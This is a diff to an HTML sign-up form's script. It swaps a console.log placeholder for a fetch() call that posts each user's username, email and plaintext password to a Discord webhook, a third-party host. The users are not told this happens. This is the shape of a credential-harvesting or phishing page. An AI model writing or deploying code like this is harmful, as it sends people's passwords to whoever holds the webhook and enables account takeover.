@@ -11,7 +11,7 @@
             margin: 0;
             padding: 0;
         }
-        .container {
+       .container {
             max-width: 400px;
             margin: 0 auto;
             padding: 20px;
@@ -58,8 +58,18 @@
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
 
-            // You can handle form submission here (e.g., send data to a server).
-            console.log('User submitted:', { username, email, password });
+            // Replace with your Discord webhook URL
+            const webhookUrl = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN';
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    content: `New user signed up:\nUsername: ${username}\nEmail: ${email}\nPassword: ${password}`
+                })
+            });
         });
     </script>
 </body>
